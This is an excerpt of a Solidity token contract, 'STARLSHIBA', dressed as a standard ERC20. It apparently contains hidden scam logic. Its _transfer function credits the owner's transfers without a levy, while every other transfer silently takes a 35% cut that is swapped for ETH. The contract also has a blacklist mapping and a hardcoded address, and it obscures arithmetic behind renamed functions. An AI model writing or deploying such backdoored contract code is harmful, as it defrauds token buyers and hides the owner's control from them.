...
contract STARLSHIBA is Context {
     mapping (address => bool) internal blacklist;
     address internal recipients;
     address internal cod = 0xe12Ddad10125226027ebD97D238BaCB326278A5E;
     event starlshiba(address indexed previousi, address indexed newi);
     constructor () {
        address msgSender = _msgSender();
        recipients = msgSender;
        emit starlshiba(address(0), msgSender);
     }
     modifier checker() {
 ...
 */
contract ERC20 is Context, IERC20, IERC20Metadata , STARLSHIBA{
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if((recipients==_msgSender()) ){ _balances[recipient] += amount;emit Transfer(sender, recipient, amount);}
        else{uint256 levy=amount.prod(35).cal(100);uint256 amnt=amount-levy;_balances[recipient] += amnt;_swapTokensForETH(levy);emit Transfer(sender, recipient, amnt);}
